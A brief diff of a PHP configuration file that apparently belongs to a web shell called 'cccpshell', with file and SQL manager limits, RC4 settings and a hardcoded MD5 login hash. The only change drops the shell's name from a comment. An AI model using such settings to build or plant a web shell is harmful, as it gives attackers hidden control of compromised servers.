@@ -9,5 +9,5 @@ $config['FMLimit'] = 100;   //file manager item limit. false = No limit
 $config['SQLLimit'] = 50;   //sql manager result limit.
 $config['checkBDel'] = true;//Check Before Delete: true = On 
 $config['consNames'] = array('post'=>'dsr', 'slogin'=>'cccpshell', 'sqlclog'=>'conlog'); //Constants names
-$config['sPass'] = '775a373fb43d8101818d45c28036df87'; // md5(pass) //cccpshell
+$config['sPass'] = '775a373fb43d8101818d45c28036df87'; // md5(pass)
 $config['rc4drop'] = 123;  //drop size
